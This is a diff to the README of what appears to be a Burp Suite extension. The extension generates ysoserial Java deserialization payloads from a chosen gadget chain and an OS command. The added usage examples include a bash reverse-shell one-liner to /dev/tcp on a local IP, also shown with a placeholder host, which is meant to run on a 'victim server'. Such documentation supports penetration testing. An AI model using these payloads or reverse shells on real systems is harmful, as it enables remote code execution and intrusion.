@@ -14,6 +14,13 @@ There are 3 ways to run this extension.
  
  Select the above text and right click any of the Java Serialized Payload Options and it will replace your command with a payload containing that command.
  
+ The first parameter before the pipe in the above statement is the verion of the exploit. You can enter any of the following:
+  - CC1 or CollectionCommons1
+  - CC2 or CollectionCommons2
+  - GV1 or Groovy1
+  - SP1 or Spring1
+ The second parameter is obviously the OS command you wish to run.
+ 
 ## Complex Commands (i.e. pipes and I/O redirection)
 Note ysoserial in this extension has been updated to accept more complicated commands that in the original. For instance commands the following command would fail to execute on the victim server:
  
@@ -27,3 +34,23 @@ This is because to run complex commands that pipe command into other commands in
  
 The above code will be split into a string array that java can run on the victim server. :) The resulting java code would look like:
 ```Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/X.X.X.X/9997 0>&1"});```
+
+##Examples
+### Example 1 - Replace selected text with a pre-generated payload
+1. First Generate a payload
+![Payload Generator](/Payload%20Generator.png)
+2. Go to Repeater and select the text you want to replace.
+3. Right Click and select a payload option.
+![Payload Generator](/replace%20with%20generated.png)
+
+### Example 2 - Use and inline command
+1. In Burp Repeater replace your parameter with the following code:
+ ```$(CC1|ping -c1 8.8.8.8)```
+2. Select the above text. Right Click in repeater and select the payload type.
+![Payload Generator](/inline-command.png)
+
+### Example 3 - Complex commands 
+1. In Repeater replace your parameter with the following command:
+```$(CC1|/bin/bash,,-c,,bash -i >& /dev/tcp/192.168.1.223/9997 0>&1)```
+2. Select it and select the payload you want to generate.
+![Payload Generator](/inline%20complex%20command.png)
